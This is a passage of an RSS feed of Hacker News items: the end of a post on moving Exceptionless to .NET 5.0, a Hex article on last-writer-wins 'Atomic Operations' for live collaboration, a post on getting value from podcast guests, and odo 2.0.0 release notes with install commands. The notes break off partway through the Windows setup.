<p>There are always multiple schools of thought around running pre-release code on production applications, but for us, the decision was a no-brainer. The top motivators were performance improvements, availability of new C# features, and Docker improvements for our self-hosted solution.</p>



<h2>Performance Improvements</h2>



<p>We are a developer tool, and as such, performance is important. .NET 5.0 allows us to leverage the performance boosts associated with the upgrade and pass that along to our customers and the community around us. We compared our memory and performance from .NET Core 3.1 to the .NET 5.0 rc-1 release and saw enough gains to help support our decision to move forward with rolling this out to production.</p>



<p>The .NET team‚Äôs focus on pushing the boundaries of garbage collection was an important factor for us. GC is such a critical component to performance, and it impacts almost everything within the framework. We were excited to see the&nbsp;<a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-5/#gc">focus Microsoft put on continuing to improve performance</a>&nbsp;in this area and felt the gains were enough to really tilt us towards our production release of Exceptionless using .NET 5.0.</p>



<p>As a quick, visual example, of other improvements, here‚Äôs a table Ben Adams tweeted that gives us glimpse into the performance gains of .NET 5.0 over .NET 3.1: </p>



<figure></figure>



<h2>New C# Features</h2>



<p>With the release of C# 9, we, once again, get significant improvements. Anytime a programming language releases new features, it‚Äôs important to ask yourself whether those features are necessary for your application. In the case of C# 9, there are multiple features we believe will help improve the code legibility, overall codebase size, and ultimately performance. It always comes back to performance!</p>



<p>Pattern matching in C# 9 is a feature we are particularly excited about. If you‚Äôre interested in a deep dive into the improvements here,&nbsp;<a href="https://anthonygiretti.com/2020/06/23/introducing-c-9-improved-pattern-matching/">Anthony Giretti has a great post</a>&nbsp;highlighting the new functionality. For Exceptionless, pattern matching represents a better way for us to execute logical operations we already support. In doing so, we can reduce code complexity, improve performance, and deliver a better experience.</p>



<p>Records are an exciting new feature in C# 9 as well. Data immutability is important, once again, for‚Äîyou guessed it‚Äîperformance. The way&nbsp;<a href="https://daveabrock.com/2020/07/06/c-sharp-9-deep-dive-records">Dave Brock puts it</a>&nbsp;on his blog is apt:</p>



<blockquote><p>Immutable types reduce risk, are safer, and help to prevent a lot of nasty bugs that occur when you update your object.</p></blockquote>



<p>Data records give us immutability in the form of a dedicated struct. Rather than extending the functionality of C#‚Äôs existing structs, records give us the ability to reach for a data-specific type that offers built-in immutability.</p>



<h2>Docker Improvements</h2>



<p>We are proud of our open-source roots. We want to make self-hosting Exceptionless as easy as possible, and Docker has made this a reality. Our Docker image is the fastest and easiest way to get started with self-hosting and .NET 5.0 only improves the Docker experience.</p>



<p>.NET 5.0 enables better resource compaction which, in turn, reduces the cost associated with Docker images. This is important to the bottom line, but .NET 5.0‚Äôs improvements go beyond dollar-savings with Docker. The new features also improve memory constraints which‚Äîsay it with me now‚Äîimprove performance.</p>



<p>One additional benefit of the .NET 5.0 rc-1 release candidate is how our Docker image now works better with Kubernetes resource constraints. We‚Äôre pretty big fans of Docker and Kubernetes, so anything to improve the experience around both is a win in our eyes.</p>



<h2>Conclusion</h2>



<p>We took an early release candidate from a massive framework and rolled it out to production almost immediately after it was announced. Are we crazy? We don‚Äôt think so, but you decide.</p>
              </div></div>]]>
            </description>
            <link>https://exceptionless.com/why-we-upgraded-our-production-application-to-net-5-0/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579969</guid>
            <pubDate>Thu, 24 Sep 2020 16:02:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Pragmatic Approach to Live Collaboration]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579935">thread link</a>) | @maclockard
<br/>
September 24, 2020 | https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration | <a href="https://web.archive.org/web/*/https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>At <a href="https://hex.tech/" target="_blank" rel="nofollow">Hex</a>, we're all about making data workflows more collaborative. Our product allows users to connect to data, build analyses with Python and SQL, and turn them into interactive apps anyone can use.</p><p>The backing "Logic View" of a Hex project is powered by a notebook-style interface, similar in spirit to products like Mathematica or Jupyter. From early on, we wanted to support live multi-user editing in this Logic View so users can review or assist each other with their work.</p><figure>
    <span>
      <span></span>
  <img alt="Our Logic view: a notebook-style interface" title="Our Logic view: a notebook-style interface" src="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png" srcset="https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ccb66/hex_logic_view.png 185w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/3ac6e/hex_logic_view.png 370w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/b38af/hex_logic_view.png 740w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/ffc38/hex_logic_view.png 1110w, https://hex.tech/static/a2beb2e7deaf89901a98f9e4d52b225c/0ff2a/hex_logic_view.png 1138w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span>
    <figcaption>Our Logic view: a notebook-style interface</figcaption>
  </figure><p>Our team evaluated several options, and wound up pursuing a pragmatic approach which we were able to implement for our entire application in less than six weeks. We are excited to share some details for others who might be thinking through similar decisions.</p><h2>State of the Art</h2><p>There are two dominant approaches to multi-user collaboration today: <strong>Operational Transforms</strong> and <strong>Conflict-free Replicated Data Types</strong>. Both are powerful, although they come with trade-offs that make implementation challenging, particularly for smaller teams like ours. There is also a lesser-known hybrid approach‚Äîoriginally pioneered by Figma‚Äîgeared towards ease of implementation.</p><h3>Operational Transforms</h3><p><a href="https://en.wikipedia.org/wiki/Operational_transformation" target="_blank" rel="nofollow">Operational Transforms</a> (OT) has been around for years. This technology is famously used to back Google Docs, and there are a number of reference implementations available on the web.</p><div><div><p><strong>The basic idea of OT</strong> is to decompose all state mutations to specific operations.</p><p>As an example, let's say we want two editors to simultaneously edit the string <code>ello</code>. Editor 1 sends an operation that inserts <code>!</code> at position 4 (or <code>[!, 4]</code> for short) and Editor 2 sends another operation that inserts <code>H</code> at position 0 (or <code>[H, 0]</code>).</p><p>If received in this order, a client can process these operations as they are and get the desired text <code>Hello!</code>. However, if a client were to receive <code>[H, 0]</code> first and <code>[!, 4]</code> second, the resulting string would be the incorrect <code>Hell!o</code>. OT implementations need to account for this, and implement a transformation to correct or "transform" the second operation to <code>[!, 5]</code> in order to preserve the user's intent and get <code>Hello!</code>.</p></div></div><p>In order to properly broker operations between clients, OT requires a centralized server, which may not be acceptable for all use cases.</p><p>OT offers a lot of control to the developer over how user actions are de-conflicted, making it easy to preserve user intent and context.</p><p>The "transform" part, however, can be quite tricky and error-prone since an implementor needs to account for each pair of operations. The number of possible combinations grows quadratically with the number of operations, meaning even with extensive testing it's possible to miss an edge case. This combinatorial complexity means an application gets harder and harder to reason about over time. <sup id="fnref-1"><a href="#fn-1">1</a></sup></p><h3>Conflict-free Replicated Data Types</h3><p><a href="https://en.wikipedia.org/wiki/Conflict-free_replicated_data_type" target="_blank" rel="nofollow">Conflict-free Replicated Data Types</a> (CRDTs) are a newer alternative that sidesteps much of the complexity that burdens OT.</p><div><div><p><strong>The basic idea of CRDT</strong> is to use data structures that are inherently (you guessed it) conflict-free.</p><p>There are <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#portfolio-of-basic-crdts" target="_blank" rel="nofollow">several different CRDTs</a>, each with their own implementation details. An example CRDT is a <a href="https://www.baeldung.com/java-conflict-free-replicated-data-types#grow-only-set" target="_blank" rel="nofollow">Grow Only Set</a>, which can only have elements added to it, but never removed. Conflicts are avoided since it is impossible to add/remove an item at the same time.</p><p>A multiplayer application can compose different types of CRDTs to create more complex structures for modeling its state.</p></div></div><p>CRDTs avoid the combinatorial complexity that comes along with OT, and also enable direct client-to-client communication, removing the need for a central server. Despite these advantages, they still have major trade-offs.</p><p>While CRDTs are correct from a mathematical standpoint, they might not have the correct semantics for a specific application. For example, the result of a state mutation is always consistent, but it may not be exactly what was expected since it's possible to lose user intent. <sup id="fnref-2"><a href="#fn-2">2</a></sup></p><p>CRDTs also trade off the complexity of resolving conflicts for a more challenging initial implementation, due to their reliance on algorithms like <a href="https://en.wikipedia.org/wiki/Vector_clock" target="_blank" rel="nofollow">vector clocks</a>. They also incur a fair amount of storage overhead‚Äîwhile there is <a href="https://www.youtube.com/watch?v=x7drE24geUw&amp;feature=youtu.be&amp;t=3198" target="_blank" rel="nofollow">progress being made</a>, avoiding this problem requires foresight and cleverness. And since CRDTs are newer, there are fewer reference implementations. <sup id="fnref-3"><a href="#fn-3">3</a></sup></p><h3>Figma's Hybrid Approach</h3><p>While at first we considered OT and CRDTs as our two main options, we were intrigued by <a href="https://www.figma.com/blog/how-figmas-multiplayer-technology-works/" target="_blank" rel="nofollow">the pragmatic approach taken by Figma</a>. They borrowed some ideas from CRDTs, like a <a href="https://github.com/pfrazee/crdt_notes/tree/68c5fe81ade109446a9f4c24e03290ec5493031f#last-writer-wins-register-lww-register" target="_blank" rel="nofollow">last-writer-wins data register</a>. Instead of using vector clocks to provide an ordering guarantee, however, they used a central authority, similar to OT.</p><p>By using the best parts of both OT and CRDTs, Figma avoided challenges with de-conflicting operations and difficulty of implementation. The main trade-off is that certain functionality, such as multi-user editable text strings, is not easily supported.</p><p>Figma's hybrid technique resonated with us as being both practical and elegant, although it was surprising that we couldn't find examples of others pursuing a similar approach. <sup id="fnref-4"><a href="#fn-4">4</a></sup></p><p>
  <video src="https://hex.tech/images/blog/figma-multiplayer.mp4" preload="auto" muted="" loop="" playsinline="" webkit-playsinline="" x5-playsinline="" autoplay="">
  </video>
<figcaption>From Figma's Blog Post</figcaption></p><h2>Choosing a Path</h2><p>As we assessed our options, we weighed a few key factors:</p><h3>Taking it step by step</h3><p>It was important to us that our solution was <a href="https://hex.tech/blog/incremental-shipping" target="_blank" rel="nofollow">shippable incrementally</a> and completable within a reasonable time frame. Any solution that required rewriting significant parts of our code base all at once, or a "big bang" cutover, would have not been acceptable.</p><h3>Our current stack</h3><p>Some existing multiplayer frameworks, such as <a href="https://github.com/share/sharedb" target="_blank" rel="nofollow">ShareDB</a>, require storing the model in a specific format and shape, or that the frontend connects to the model in a particular way.</p><p>We wanted to avoid major changes like this. An ideal solution would need to work well with our current tools, including:</p><ul>
<li><a href="https://www.apollographql.com/docs/" target="_blank" rel="nofollow">Apollo + GraphQL</a> to build an API schema shared by our frontend and backend services</li>
<li><a href="https://graphql-code-generator.com/" target="_blank" rel="nofollow">GraphQL Code Generator</a> and Typescript to ensure type safety across the entire stack</li>
<li><a href="https://www.apollographql.com/docs/react/" target="_blank" rel="nofollow">Apollo Client</a> on the frontend to store requested data in a normalized object cache that allows React to intelligently subscribe to changes</li>
<li>PostgreSQL and relational database patterns/features like normalization, constraints, and transactions to help guarantee data consistency and correctness</li>
</ul><p>This stack strikes a good balance between feature velocity and stability, and we wanted to build on top of it‚Äînot replace it.</p><h3>Controlling our destiny</h3><p>As we considered these approaches, we evaluated a number of open source libraries. We're generally enthusiastic about adopting and contributing to OSS, and originally thought to do so here.</p><p>While there are some great projects out there, like <a href="https://github.com/automerge/automerge" target="_blank" rel="nofollow">Automerge</a> and <a href="https://github.com/yjs/yjs" target="_blank" rel="nofollow">Y.js</a>, it can be risky to outsource something as core as our application state. Even really promising projects can lose momentum: <a href="https://github.com/Operational-Transformation/ot.js/" target="_blank" rel="nofollow">ot.js</a>, for example, is an Operational Transform library with over 1.2k stars on Github, but is no longer under active development and is looking for a maintainer.</p><h2>Atomic Operations</h2><p>After considering our options, we pursued an approach inspired by Figma's hybrid solution. We call it <strong>Atomic Operations (AO),</strong> as all edits to application state are broken down to their smallest <em>atomic</em> parts.</p><p>For us, this technique struck the right balance between ease of implementation, compatibility with our stack, and control over the application foundations.</p><p><span>
      <span></span>
  <img alt="splitting atom" title="splitting atom" src="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png" srcset="https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/ccb66/splitting-atom.png 185w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/3ac6e/splitting-atom.png 370w, https://hex.tech/static/6f23e527d113a4b225b481e26dff0926/b38af/splitting-atom.png 740w" sizes="(max-width: 740px) 100vw, 740px" loading="lazy">
    </span></p><h3>Splitting the Atom</h3><p>AO mutations exist at the single property update level, such that <strong>two operations of different types cannot conflict with each other.</strong></p><p>It is, however, still possible for two operations of the <em>same type</em> to conflict. This is determined by an operation's <code>conflictId</code>, which is a concatenation of its type and the ID of the object being edited. <sup id="fnref-5"><a href="#fn-5">5</a></sup> Since we use last-writer-wins semantics, we don't merge conflicts, we just pick a winner.</p><p>For determining which operation is "last", the server keeps track of a monotonically increasing counter per object that increments with each write. Upon acknowledging an operation, the server includes the latest value of this counter. To determine which operation is a winner, the client simply chooses the operation with the higher value. A central authority is required to implement this monotonic counter, prohibiting any distributed implementations.</p><p>As an example, take a hypothetical object type "foobar":</p><div data-language="typescript"><pre><code><span>interface</span> <span>Foobar</span> <span>{</span>
  id<span>:</span> <span>string</span>
  name<span>:</span> <span>string</span>
  color<span>:</span> <span>string</span>
<span>}</span></code></pre></div><p>Here are some examples of atomic operations for creating and editing a foobar:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"CREATE_FOOBAR"</span><span>,</span>
  conflictId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    name<span>:</span> <span>"My new foobar"</span><span>,</span>
    color<span>:</span> <span>"#DE1738"</span>
  <span>}</span>
<span>}</span>

<span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_COLOR"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_COLOR-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newColor<span>:</span> <span>"#0B6623"</span>
  <span>}</span>
<span>}</span></code></pre></div><p>Again: by breaking down all edits to a foobar object to changing individual properties, we remove the need to worry about how different operations might merge‚Äî<strong>at this level of granularity, only one write <em>can</em> win.</strong></p><p>A nice benefit of this decomposition is that all mutations to state are described by plain objects. A keen eye might note some parallels with how <a href="https://redux.js.org/basics/actions" target="_blank" rel="nofollow">Redux defines actions</a>, and indeed AO similarly benefits from making state mutations predictable, transparent, and easily testable.</p><p>Finally, we implemented undo / redo by requiring all atomic operation to include an additional operation that can undo the change. As an example:</p><div data-language="typescript"><pre><code><span>{</span>
  <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
  conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
  creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
  payload<span>:</span> <span>{</span>
    id<span>:</span> <span>"123ABC"</span><span>,</span>
    newName<span>:</span> <span>"My slightly less new foobar"</span>
  <span>}</span><span>,</span>
  undo<span>:</span> <span>{</span>
    <span>type</span><span>:</span> <span>"SET_FOOBAR_NAME"</span><span>,</span>
    conflictId<span>:</span> <span>"SET_FOOBAR_NAME-123ABC"</span><span>,</span>
    creationId<span>:</span> <span>"CREATE_FOOBAR-123ABC"</span><span>,</span>
    payload<span>:</span> <span>{</span>
      id<span>:</span> <span>"123ABC"</span><span>,</span>
      newName<span>:</span> <span>"My new foobar"</span> 
    <span>}</span><span>,</span>
  <span>}</span>
<span>}</span></code></pre></div><h3>Getting fractional</h3><p>A drawback of AO is that certain types of mutations can be difficult to express as simple last-writer-wins operations.</p><p>One such case is ordered collections. With classic integer indexing of a collection, ‚Ä¶</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration">https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</a></em></p>]]>
            </description>
            <link>https://hex.tech/blog/a-pragmatic-approach-to-live-collaboration</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579935</guid>
            <pubDate>Thu, 24 Sep 2020 16:00:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Get More from Your Podcast Guests]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24579892">thread link</a>) | @tomhuntio
<br/>
September 24, 2020 | https://blog.bcast.fm/podcast-guests/ | <a href="https://web.archive.org/web/*/https://blog.bcast.fm/podcast-guests/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Podcast guests are great...</p><p>They introduce your audience to a whole new perspective, can entertain and inspire. We all know that.</p><p>That said, few podcasters maximise the true value of their guests. <strong>This is post aims to change that.</strong></p><p>Over the past five years, our team has worked with HUNDREDS podcasters and thousands of guests... we've seen partnerships made, deals closed and lifelong friendships formed through podcast interviews.</p><p>We also surveyed the bCaster community: <a href="https://www.facebook.com/groups/profitablepodcastshq">Profitable Podcasts</a> and have come up with the biggest and best list of methods you can use to get more from your guests.</p><p>So read through and choose JUST one to implement with your next guest... you never know what may happen ;)</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-1.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-1.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-1.png 1000w, https://blog.bcast.fm/content/images/2020/09/image-1.png 1232w" sizes="(min-width: 720px) 720px"></figure><p>This is now widely accepted in the podcast space... you jump on a podcast as a guest, you share afterwards.</p><p>This immediately gets you, your business and your podcast exposed to the guest of that audience. bCast will send each guest an email when the episode goes live with share links to the major social platforms.</p><p>If you don't use bCast... do this yourself ;)</p><h3 id="2-feedback-on-your-podcast"><strong>2 ‚Äî Feedback On Your Podcast</strong></h3><p>This is a no-brainer.</p><p>If your podcast is going to thrive in the coming months and years, you need to get better.</p><p>You get better by:</p><ol><li>Understanding what to improve</li><li>Improving it</li></ol><p>A REALLY good way to understand what to improve is to get honest feedback from the people that have experienced your podcast process - your guests.</p><p>You want to ask:</p><ul><li>Is there anything I can improve about the booking process?</li><li>Is there anything I can improve in the questions?</li><li>Is there anything I can improve on as the host?</li></ul><p>If you do this with every guest, soon your podcast will be a will oiled machine, lead generating, attention machine :)</p><h3 id="3-get-the-backlink"><strong>3 ‚Äî Get The Backlink</strong></h3><p>This is more rare...</p><p>Your site will only rank in Google for keywords if you get other relevant and authoritative sites in your niche to link to you. And who better than your podcast guests?</p><p>There are two ways we can do this:</p><ul><li>If the guest has a press/interview list, then simply ask to be included:</li></ul><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-2.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-2.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-2.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-2.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-2.png 1924w" sizes="(min-width: 720px) 720px"></figure><ul><li>If the guest has a blog, offer to write up a summary for them to post and include a link back to your site:</li></ul><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-3.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-3.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-3.png 1000w, https://blog.bcast.fm/content/images/2020/09/image-3.png 1480w" sizes="(min-width: 720px) 720px"></figure><p>If they don't do either of these, then offer to link from an article of yours, with them linking back to your interview from an article of theirs.</p><p>And BOOM ‚Äî you're getting a backlink with each episode.</p><h3 id="4-guest-referral"><strong>4 ‚Äî Guest Referral</strong></h3><p>This is a simple one.</p><p>Good guests will know other good guests, it's a simple as asking the guest post interview if they know anyone they think would be a good fit. Then you just reach out to the new person saying:</p><blockquote> "X mentioned that you would be an awesome podcast guest... shall I share more info? ;)</blockquote><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-8.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-8.png 600w, https://blog.bcast.fm/content/images/2020/09/image-8.png 988w" sizes="(min-width: 720px) 720px"></figure><p>The ninja trick here is to include the referral IN THE INTERVIEW itself with a question like:</p><blockquote>Who is one person within [[podcast niche]] that you would LOVE to take to lunch?</blockquote><p>As now, you can reach out to that person asking them to be a guest AND share the interview where they have been featured.</p><h3 id="5-intro-to-the-right-person"><strong>5 ‚Äî Intro To The Right Person</strong></h3><p>Personal intros are effective.</p><p>They essentially say:</p><blockquote>This person is safe to work with, I approve of them.</blockquote><p>And this can be MASSIVE in sales process. Your competitor may be bigger, better funded and have a better brand than you. But if they don't have an intro, you'll be the first to get the meeting.</p><p>So if there is someone within the network or business of your guest, don't be afraid to simply ask:</p><blockquote>Hey, would you be happy to introduce me to X? It would be great to talk to him about Y.</blockquote><p>When you're in the post podcast interview love bubble, this request will get a 90% success rate.</p><h3 id="6-move-down-the-sales-process"><strong>6 ‚Äî Move Down The Sales Process</strong></h3><p>This is the holy grail.</p><p>We've had <a href="https://fame.so/">Fame</a> clients start a podcast with us and have their first guest reach out asking to buy their product:</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-5.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-5.png 600w, https://blog.bcast.fm/content/images/2020/09/image-5.png 874w" sizes="(min-width: 720px) 720px"></figure><p>Obviously that is the ideal set up, but most of the time it doesn't happen like that ‚Äî you need to seamlessly move your guests down that process.</p><p>How?</p><p>Well first we must ask... what is a VERY low commitment and relevant step that you can take with your guest towards solving their problem post interview?</p><p><em>Note that I say... only if they have a problem you can solve. If they don't have a problem you can solve then there is no point in trying to sell to them.</em></p><p>This could be:</p><ul><li>A free trial</li><li>A strategy session</li><li>An audit</li></ul><p>Anything that adds value but will also move the guest down through your sales process, it must be:</p><ol><li>Free</li><li>Better than what is publicly available</li></ol><p>If you do this right, and you add value with this step - you will be one step closer to converting from guest, to customer.</p><h3 id="7-promote-your-product"><strong>7 ‚Äî Promote Your Product</strong></h3><p>Now not every podcast guest will be a perfect customer.</p><p>But what I can say is that most guests will be either a perfect customer or a perfect partner. E.g. they will either be able to buy your product or will have an audience or a network of people that could buy your product.</p><p>So if they have the latter, the same process as #6 applies ‚Äî what is the next step you need to take with them to forming a partnership with the guest?</p><p>The guest may:</p><ul><li>Introduce you to relevant contacts in exchange for a one off fee</li><li>Promote your product to their audience in exchange for a commission</li><li>White label your service whilst paying you a monthly subscription</li></ul><p>Normally the next step post interview is to set up another chat to see how you could help each other...</p><h3 id="8-feedback-on-your-product"><strong>8 ‚Äî Feedback On Your Product</strong></h3><p>Now if you don't want to move a guest down the sales or partnership process - the least you can do is maybe get their feedback on what you're trying to do right?</p><p>For this, simply ask the guest post interview for 15 minutes of their time so you can ask them a few questions about your niche and for them to review your product/service.</p><p>80% will agree and you never know... if your product truly solves a problem they have, they may even move into the sales process anyway ;)</p><p>This is a no-brainer.</p><p>We advise clients and bCast users to create a community around their podcast:</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-6.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-6.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-6.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-6.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-6.png 2056w" sizes="(min-width: 720px) 720px"></figure><p>It's great to bring the guests in there to answer questions about their episode to add more value to your audience.</p><p>Maybe the guests will get elevated status in the community, such as a Moderator in a Facebook Group or you will link out to their content from the pinned post.</p><h3 id="10-gain-a-testimonial"><strong>10 ‚Äî Gain A Testimonial</strong></h3><p>Few people use this one...</p><p>But you when you are trying to book a guest you are selling. You are selling them your audience and exposure and you are buying their time.</p><p>So when you normally sell something, you normally include a testimonial from someone else that has taken that risk.</p><p>So why not do this with your guests?</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-4.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-4.png 600w, https://blog.bcast.fm/content/images/size/w1000/2020/09/image-4.png 1000w, https://blog.bcast.fm/content/images/size/w1600/2020/09/image-4.png 1600w, https://blog.bcast.fm/content/images/2020/09/image-4.png 2270w" sizes="(min-width: 720px) 720px"></figure><p>Again, remember when you reach out to a guest to bring them onto your podcast ‚Äî you are selling.</p><p><em>What is another trick sales people use when selling?</em></p><p>Social proof.</p><p>When you get a big name guest, use their name or their businesses name in your outreach or conversations with new potential guests.</p><figure><img src="https://blog.bcast.fm/content/images/2020/09/image-9.png" alt="" srcset="https://blog.bcast.fm/content/images/size/w600/2020/09/image-9.png 600w, https://blog.bcast.fm/content/images/2020/09/image-9.png 982w" sizes="(min-width: 720px) 720px"></figure><p>This reduces risk of them as they think:</p><blockquote>Well if X did this podcast, then it must be good enough for me!</blockquote><hr><p>Alright...</p><p><em>Have you chosen the one you will implement?</em></p><p>If not, go back through the post and select one ‚Äî implement this on your next guest and start the ball rolling towards a more profitable podcast.</p><p>Once implemented, jump <a href="https://www.facebook.com/groups/profitablepodcastshq">into the community</a> or hit us up on <a href="mailto:support@bcast.fm">support@bcast.fm</a> to let us know how it went...</p>
                </div>
            </section></div>]]>
            </description>
            <link>https://blog.bcast.fm/podcast-guests/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24579892</guid>
            <pubDate>Thu, 24 Sep 2020 15:57:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Red Hat releases 2.0.0 of Odo, a Kubernetes and OpenShift dev tool]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24579814">thread link</a>) | @twelvenmonkeys
<br/>
September 24, 2020 | https://odo.dev/blog/odo-200-ga-release/ | <a href="https://web.archive.org/web/*/https://odo.dev/blog/odo-200-ga-release/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<div>
							<p><code>2.0.0</code> of odo has been released!</p>



<h4 id="changes-to-the-default-deployment-method">Changes to the default deployment method</h4>

<p><a href="ihttps://devfile.github.io/devfile/index.html">Devfile</a> is a file format that is used as odo‚Äôs new deployment engine. Starting from <code>2.0.0</code> onwards, Source-to-Image (S2I) is no longer the default deployment method. S2I is still supported and can now be accessed with the <code>--s2i</code> flag from the command-line.</p>

<p>Learn how to deploy your first devfile using devfiles from our <a href="https://odo.dev/docs/deploying-a-devfile-using-odo/">Devfile tutorial</a>.</p>

<p>Example on how to download a starter project and deploy a devfile:</p>

<div><div><pre><code><span>$ </span>odo create nodejs <span>--starter</span>
Validation
 ‚úì  Checking devfile existence <span>[</span>22411ns]
 ‚úì  Checking devfile compatibility <span>[</span>22492ns]
 ‚úì  Creating a devfile component from registry: DefaultDevfileRegistry <span>[</span>24341ns]
 ‚úì  Validating devfile component <span>[</span>74471ns]

Starter Project
 ‚úì  Downloading starter project nodejs-starter from https://github.com/odo-devfiles/nodejs-ex.git <span>[</span>479ms]

Please use <span>`</span>odo push<span>`</span> <span>command </span>to create the component with <span>source </span>deployed

<span>$ </span>odo push

Validation
 ‚úì  Validating the devfile <span>[</span>132092ns]

Creating Kubernetes resources <span>for </span>component nodejs
 ‚úì  Waiting <span>for </span>component to start <span>[</span>5s]

Applying URL changes
 ‚úì  URL http-3000: http://http-3000-nodejs-foobar.myproject.example.com/ created

Syncing to component nodejs
 ‚úì  Checking files <span>for </span>pushing <span>[</span>1ms]
 ‚úì  Syncing files to the component <span>[</span>868ms]

Executing devfile commands <span>for </span>component nodejs
 ‚úì  Executing <span>install command</span> <span>"npm install"</span> <span>[</span>4s]
 ‚úì  Executing run <span>command</span> <span>"npm start"</span> <span>[</span>2s]

Pushing devfile component nodejs
 ‚úì  Changes successfully pushed to component
</code></pre></div></div>

<h4 id="deploying-a-custom-kubernetes-controller-with-odo">Deploying a custom Kubernetes controller with odo</h4>

<p>With the release of <code>2.0.0</code> deploying operators is now out of experimental mode.</p>

<p>Learn how to deploy your first Kubernetes custom controller from our <a href="https://odo.dev/docs/operator-hub/">Operator documentation</a>.</p>

<p>Example on how to deploy your first Operator:</p>

<div><div><pre><code><span>$ </span>odo catalog list services
  Operators available <span>in </span>the cluster
  NAME                          CRDs
  etcdoperator.v0.9.4           EtcdCluster, EtcdBackup, EtcdRestore

<span>$ </span>odo service create etcdoperator.v0.9.4/EtcdCluster
</code></pre></div></div>

<h4 id="odo-debug-is-no-longer-in-technical-preview"><code>odo debug</code> is no longer in technical preview</h4>

<p>The <code>odo debug</code> command is no longer in technical preview.</p>

<p><a href="https://odo.dev/docs/debugging-using-devfile/">Learn how to debug your component via the CLI or VSCode</a>.</p>



<h2 id="installing-odo-on-linux">Installing odo on Linux</h2>

<h3 id="binary-installation">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-linux-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-macos">Installing odo on macOS</h2>

<h3 id="binary-installation-1">Binary installation</h3>

<div><div><pre><code># curl -L https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-darwin-amd64 -o /usr/local/bin/odo
# chmod +x /usr/local/bin/odo
</code></pre></div></div>

<h2 id="installing-odo-on-windows">Installing odo on Windows</h2>

<h3 id="binary-installation-2">Binary installation</h3>

<ol>
  <li>
    <p>Download the latest  <a href="https://mirror.openshift.com/pub/openshift-v4/clients/odo/latest/odo-windows-amd64.exe"><code>odo.exe</code></a>   file.</p>
  </li>
  <li>
    <p>Add the location of your <code>odo.exe</code> to your <code>GOPATH/bin</code> directory.</p>
  </li>
</ol>

<h3 id="setting-the-path-variable-for-windows-10">Setting the <code>PATH</code> variable for Windows 10</h3>

